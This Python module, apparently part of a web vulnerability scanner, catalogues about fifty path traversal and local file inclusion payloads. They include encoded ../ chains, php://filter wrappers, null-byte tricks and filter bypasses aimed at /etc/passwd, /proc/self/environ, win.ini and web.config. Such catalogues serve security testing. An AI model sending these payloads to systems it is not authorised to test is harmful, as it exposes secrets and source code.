"""
Module: talos.path_traversal.payloads

Purpose:
    Path traversal / LFI payload catalogue.

    Payloads **replace** the captured field value (file-path parameters
    are not SQL-like append surfaces). ``suffix`` mode concatenates
    ``original/payload`` for apps that join a base directory.

    Families:
        unix      — absolute Linux/Unix files (/etc/passwd, /proc, …)
        windows   — win.ini, hosts, boot.ini, web.config
        dotdot    — relative ../ at several depths and separators
        encoded   — URL, double-URL, overlong UTF-8, IIS %u, %5c
        wrapper   — PHP php://filter, file://
        nullbyte  — %00 truncation + fake extension
        bypass    — semicolon, extra slashes, prefix, nested dots

    Keep each technique as a distinct id so each (flow, entry point,
    payload) is one scheduler job.

Dependencies: talos.path_traversal.models
Data flow: CLI / engine → generate_path_traversal_payloads → job meta
Side effects: None.
"""

from __future__ import annotations

from typing import Optional

from talos.path_traversal.models import (
    FAMILIES,
    FAMILY_BYPASS,
    FAMILY_DOTDOT,
    FAMILY_ENCODED,
    FAMILY_NULLBYTE,
    FAMILY_UNIX,
    FAMILY_WINDOWS,
    FAMILY_WRAPPER,
    INJECT_REPLACE,
    INJECT_SUFFIX,
    OS_GENERIC,
    OS_PHP,
    OS_UNIX,
    OS_WINDOWS,
    PathTraversalPayload,
)


def _payload(
    *,
    technique: str,
    family: str,
    payload: str,
    description: str,
    os: str = OS_GENERIC,
    inject_mode: str = INJECT_REPLACE,
) -> PathTraversalPayload:
    """Purpose: Build one catalogue row."""
    return PathTraversalPayload(
        technique=technique,
        family=family,
        payload=payload,
        description=description,
        os=os,
        inject_mode=inject_mode,
    )


def _base_payloads() -> list[PathTraversalPayload]:
    """Purpose: Full raw catalogue. Filtered later by --family / --technique."""
    return [
        # ---- Unix absolute LFI -------------------------------------------
        _payload(
            technique="unix_passwd",
            family=FAMILY_UNIX,
            payload="/etc/passwd",
            description="Absolute /etc/passwd (classic Unix LFI).",
            os=OS_UNIX,
        ),
        _payload(
            technique="unix_hosts",
            family=FAMILY_UNIX,
            payload="/etc/hosts",
            description="Absolute /etc/hosts.",
            os=OS_UNIX,
        ),
        _payload(
            technique="unix_hostname",
            family=FAMILY_UNIX,
            payload="/etc/hostname",
            description="Absolute /etc/hostname.",
            os=OS_UNIX,
        ),
        _payload(
            technique="unix_issue",
            family=FAMILY_UNIX,
            payload="/etc/issue",
            description="Absolute /etc/issue (OS banner).",
            os=OS_UNIX,
        ),
        _payload(
            technique="unix_proc_version",
            family=FAMILY_UNIX,
            payload="/proc/version",
            description="Linux kernel string via /proc/version.",
            os=OS_UNIX,
        ),
        _payload(
            technique="unix_proc_environ",
            family=FAMILY_UNIX,
            payload="/proc/self/environ",
            description="Process environment via /proc/self/environ.",
            os=OS_UNIX,
        ),
        _payload(
            technique="unix_proc_cmdline",
            family=FAMILY_UNIX,
            payload="/proc/self/cmdline",
            description="Process argv via /proc/self/cmdline.",
            os=OS_UNIX,
        ),
        _payload(
            technique="unix_passwd_dot",
            family=FAMILY_UNIX,
            payload="/./etc/passwd",
            description="Dot-segment absolute /./etc/passwd.",
            os=OS_UNIX,
        ),
        # ---- Windows absolute LFI ----------------------------------------
        _payload(
            technique="win_ini",
            family=FAMILY_WINDOWS,
            payload=r"C:\Windows\win.ini",
            description="Windows win.ini (backslash path).",
            os=OS_WINDOWS,
        ),
        _payload(
            technique="win_ini_fwd",
            family=FAMILY_WINDOWS,
            payload="C:/Windows/win.ini",
            description="Windows win.ini with forward slashes.",
            os=OS_WINDOWS,
        ),
        _payload(
            technique="win_ini_rel",
            family=FAMILY_WINDOWS,
            payload=r"\Windows\win.ini",
            description="Root-relative \\Windows\\win.ini.",
            os=OS_WINDOWS,
        ),
        _payload(
            technique="win_hosts",
            family=FAMILY_WINDOWS,
            payload=r"C:\Windows\System32\drivers\etc\hosts",
            description="Windows system hosts file.",
            os=OS_WINDOWS,
        ),
        _payload(
            technique="win_boot",
            family=FAMILY_WINDOWS,
            payload=r"C:\boot.ini",
            description="Legacy boot.ini.",
            os=OS_WINDOWS,
        ),
        _payload(
            technique="win_webconfig",
            family=FAMILY_WINDOWS,
            payload=r"C:\inetpub\wwwroot\web.config",
            description="IIS web.config at the default site root.",
            os=OS_WINDOWS,
        ),
        # ---- Relative traversal ------------------------------------------
        _payload(
            technique="dd_unix_6",
            family=FAMILY_DOTDOT,
            payload="../../../../../../etc/passwd",
            description="Six ../ to /etc/passwd.",
            os=OS_UNIX,
        ),
        _payload(
            technique="dd_unix_8",
            family=FAMILY_DOTDOT,
            payload="../../../../../../../../etc/passwd",
            description="Eight ../ to /etc/passwd.",
            os=OS_UNIX,
        ),
        _payload(
            technique="dd_unix_12",
            family=FAMILY_DOTDOT,
            payload="../../../../../../../../../../../../etc/passwd",
            description="Twelve ../ to /etc/passwd (deep web roots).",
            os=OS_UNIX,
        ),
        _payload(
            technique="dd_win_6",
            family=FAMILY_DOTDOT,
            payload=r"..\..\..\..\..\..\windows\win.ini",
            description="Six ..\\ to windows\\win.ini.",
            os=OS_WINDOWS,
        ),
        _payload(
            technique="dd_mixed",
            family=FAMILY_DOTDOT,
            payload="..\\/..\\/..\\/..\\/etc/passwd",
            description="Mixed ..\\/ separators to /etc/passwd.",
            os=OS_UNIX,
        ),
        _payload(
            technique="dd_nested",
            family=FAMILY_DOTDOT,
            payload="....//....//....//etc/passwd",
            description="Nested ....// (filter strips .. once).",
            os=OS_UNIX,
        ),
        _payload(
            technique="dd_abs",
            family=FAMILY_DOTDOT,
            payload="/../../../../etc/passwd",
            description="Absolute-prefixed ../../../../etc/passwd.",
            os=OS_UNIX,
        ),
        _payload(
            technique="dd_double_slash",
            family=FAMILY_DOTDOT,
            payload="..//..//..//..//etc/passwd",
            description="Double-slash ..// traversal.",
            os=OS_UNIX,
        ),
        _payload(
            technique="dd_suffix_unix",
            family=FAMILY_DOTDOT,
            payload="../../../../etc/passwd",
            description="Append /../../../../etc/passwd to the original value.",
            os=OS_UNIX,
            inject_mode=INJECT_SUFFIX,
        ),
        _payload(
            technique="dd_suffix_win",
            family=FAMILY_DOTDOT,
            payload=r"..\..\..\..\windows\win.ini",
            description="Append /..\\..\\windows\\win.ini to the original value.",
            os=OS_WINDOWS,
            inject_mode=INJECT_SUFFIX,
        ),
        # ---- Encoded -----------------------------------------------------
        _payload(
            technique="enc_url_slash",
            family=FAMILY_ENCODED,
            payload="..%2f..%2f..%2f..%2fetc%2fpasswd",
            description="URL-encoded slashes: ..%2f..%2fetc%2fpasswd.",
            os=OS_UNIX,
        ),
        _payload(
            technique="enc_double_url",
            family=FAMILY_ENCODED,
            payload="..%252f..%252f..%252f..%252fetc%252fpasswd",
            description="Double URL-encoded slashes (%252f).",
            os=OS_UNIX,
        ),
        _payload(
            technique="enc_dot",
            family=FAMILY_ENCODED,
            payload="%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            description="URL-encoded dots (%2e%2e) with raw slashes.",
            os=OS_UNIX,
        ),
        _payload(
            technique="enc_all",
            family=FAMILY_ENCODED,
            payload="%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            description="Fully URL-encoded ../ and slashes.",
            os=OS_UNIX,
        ),
        _payload(
            technique="enc_backslash",
            family=FAMILY_ENCODED,
            payload="..%5c..%5c..%5cwindows%5cwin.ini",
            description="URL-encoded backslashes (%5c) to win.ini.",
            os=OS_WINDOWS,
        ),
        _payload(
            technique="enc_dot_backslash",
            family=FAMILY_ENCODED,
            payload="%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
            description="URL-encoded dots and backslashes to win.ini.",
            os=OS_WINDOWS,
        ),
        _payload(
            technique="enc_overlong",
            family=FAMILY_ENCODED,
            payload="..%c0%af..%c0%af..%c0%afetc/passwd",
            description="Overlong UTF-8 slash (%c0%af) bypass.",
            os=OS_UNIX,
        ),
        _payload(
            technique="enc_overlong_win",
            family=FAMILY_ENCODED,
            payload="..%c1%9c..%c1%9cwindows/win.ini",
            description="Overlong UTF-8 backslash (%c1%9c) to win.ini.",
            os=OS_WINDOWS,
        ),
        _payload(
            technique="enc_unicode_slash",
            family=FAMILY_ENCODED,
            payload="..%u2215..%u2215etc%u2215passwd",
            description="IIS %u2215 unicode slash encoding.",
            os=OS_UNIX,
        ),
        # ---- PHP / file wrappers -----------------------------------------
        _payload(
            technique="php_filter_passwd",
            family=FAMILY_WRAPPER,
            payload="php://filter/convert.base64-encode/resource=/etc/passwd",
            description="PHP filter base64 of /etc/passwd.",
            os=OS_PHP,
        ),
        _payload(
            technique="php_filter_index",
            family=FAMILY_WRAPPER,
            payload="php://filter/convert.base64-encode/resource=index.php",
            description="PHP filter base64 of index.php (source disclosure).",
            os=OS_PHP,
        ),
        _payload(
            technique="php_filter_rot13",
            family=FAMILY_WRAPPER,
            payload="php://filter/read=string.rot13/resource=/etc/passwd",
            description="PHP filter ROT13 of /etc/passwd.",
            os=OS_PHP,
        ),
        _payload(
            technique="php_filter_parent_index",
            family=FAMILY_WRAPPER,
            payload="php://filter/convert.base64-encode/resource=../index.php",
            description="PHP filter base64 of ../index.php.",
            os=OS_PHP,
        ),
        _payload(
            technique="file_uri_unix",
            family=FAMILY_WRAPPER,
            payload="file:///etc/passwd",
            description="file:///etc/passwd URI wrapper.",
            os=OS_UNIX,
        ),
        _payload(
            technique="file_uri_win",
            family=FAMILY_WRAPPER,
            payload="file:///C:/Windows/win.ini",
            description="file:///C:/Windows/win.ini URI wrapper.",
            os=OS_WINDOWS,
        ),
        # ---- Null-byte truncation ----------------------------------------
        _payload(
            technique="null_passwd",
            family=FAMILY_NULLBYTE,
            payload="/etc/passwd%00",
            description="Null-byte after /etc/passwd.",
            os=OS_UNIX,
        ),
        _payload(
            technique="null_passwd_jpg",
            family=FAMILY_NULLBYTE,
            payload="/etc/passwd%00.jpg",
            description="Null-byte plus fake .jpg extension.",
            os=OS_UNIX,
        ),
        _payload(
            technique="null_dd_png",
            family=FAMILY_NULLBYTE,
            payload="../../../../etc/passwd%00.png",
            description="Traversal + null-byte + fake .png.",
            os=OS_UNIX,
        ),
        _payload(
            technique="null_win_jpg",
            family=FAMILY_NULLBYTE,
            payload=r"C:\Windows\win.ini%00.jpg",
            description="win.ini + null-byte + fake .jpg.",
            os=OS_WINDOWS,
        ),
        _payload(
            technique="null_php_filter",
            family=FAMILY_NULLBYTE,
            payload="php://filter/convert.base64-encode/resource=/etc/passwd%00",
            description="PHP filter of /etc/passwd with trailing null.",
            os=OS_PHP,
        ),
        # ---- Filter / parser bypass --------------------------------------
        _payload(
            technique="bypass_semicolon",
            family=FAMILY_BYPASS,
            payload="..;/..;/..;/..;/etc/passwd",
            description="Servlet ..; path-parameter bypass.",
            os=OS_UNIX,
        ),
        _payload(
            technique="bypass_query",
            family=FAMILY_BYPASS,
            payload="../../../../etc/passwd?",
            description="Trailing ? to dodge extension / suffix checks.",
            os=OS_UNIX,
        ),
        _payload(
            technique="bypass_hash",
            family=FAMILY_BYPASS,
            payload="../../../../etc/passwd%23",
            description="Encoded # fragment to dodge suffix checks.",
            os=OS_UNIX,
        ),
        _payload(
            technique="bypass_dot_seg",
            family=FAMILY_BYPASS,
            payload="/etc/./passwd",
            description="/etc/./passwd (dot-segment in the middle).",
            os=OS_UNIX,
        ),
        _payload(
            technique="bypass_extra_slash",
            family=FAMILY_BYPASS,
            payload="/etc//passwd",
            description="Double slash /etc//passwd.",
            os=OS_UNIX,
        ),
        _payload(
            technique="bypass_www_prefix",
            family=FAMILY_BYPASS,
            payload="/var/www/html/../../../../etc/passwd",
            description="Absolute web-root prefix then traversal.",
            os=OS_UNIX,
        ),
        _payload(
            technique="bypass_escaped",
            family=FAMILY_BYPASS,
            payload=r"....\/....\/....\/etc/passwd",
            description="Escaped nested dots ....\\/.",
            os=OS_UNIX,
        ),
        _payload(
            technique="bypass_abs_enc",
            family=FAMILY_BYPASS,
            payload="%2fetc%2fpasswd",
            description="URL-encoded absolute /etc/passwd.",
            os=OS_UNIX,
        ),
        _payload(
            technique="bypass_current_dir",
            family=FAMILY_BYPASS,
            payload="/files/../../../../etc/passwd",
            description="Fake /files prefix then traversal.",
            os=OS_UNIX,
        ),
    ]


TECHNIQUE_CATALOG: tuple[dict[str, object], ...] = tuple(
    {
        "name": item.technique,
        "family": item.family,
        "description": item.description,
        "os": item.os,
        "inject_mode": item.inject_mode,
    }
    for item in _base_payloads()
)

TECHNIQUE_NAMES: tuple[str, ...] = tuple(str(item["name"]) for item in TECHNIQUE_CATALOG)
TECHNIQUE_BY_NAME: dict[str, dict[str, object]] = {
    str(item["name"]): item for item in TECHNIQUE_CATALOG
}

DEFAULT_PAYLOAD_COUNT = len(TECHNIQUE_CATALOG)


def render_payload(item: PathTraversalPayload, original: str) -> str:
    """
    Purpose:
        Materialize the bytes to send for one payload against one field.
    Output:
        Replacement string (suffix mode joins original + payload).
    """
    if item.inject_mode == INJECT_SUFFIX and (original or "").strip():
        base = original.rstrip("/\\")
        extra = item.payload.lstrip("/\\")
        sep = "/" if "\\" not in extra else "\\"
        return f"{base}{sep}{extra}"
    return item.payload


def generate_path_traversal_payloads(
    *,
    techniques: Optional[list[str]] = None,
    families: Optional[list[str]] = None,
) -> list[PathTraversalPayload]:
    """
    Purpose:
        Return catalogue rows filtered by --technique / --family.
    Output:
        Non-empty list. Raises ValueError on unknown filters.
    """
    payloads = list(_base_payloads())
    if families:
        allow_fam = {name.strip() for name in families if name and name.strip()}
        unknown_fam = allow_fam - set(FAMILIES)
        if unknown_fam:
            raise ValueError(
                "unknown path-traversal family: "
                + ", ".join(sorted(unknown_fam))
                + f". Expected one of: {', '.join(FAMILIES)}"
            )
        payloads = [item for item in payloads if item.family in allow_fam]

    if techniques:
        allow = {name.strip() for name in techniques if name and name.strip()}
        known = {item.technique for item in _base_payloads()}
        unknown = allow - known
        if unknown:
            raise ValueError(
                "unknown path-traversal technique(s): " + ", ".join(sorted(unknown))
            )
        payloads = [item for item in payloads if item.technique in allow]
        missing = allow - {item.technique for item in payloads}
        if missing:
            raise ValueError(
                "path-traversal technique(s) not available for the selected "
                "family: " + ", ".join(sorted(missing))
            )
    return payloads
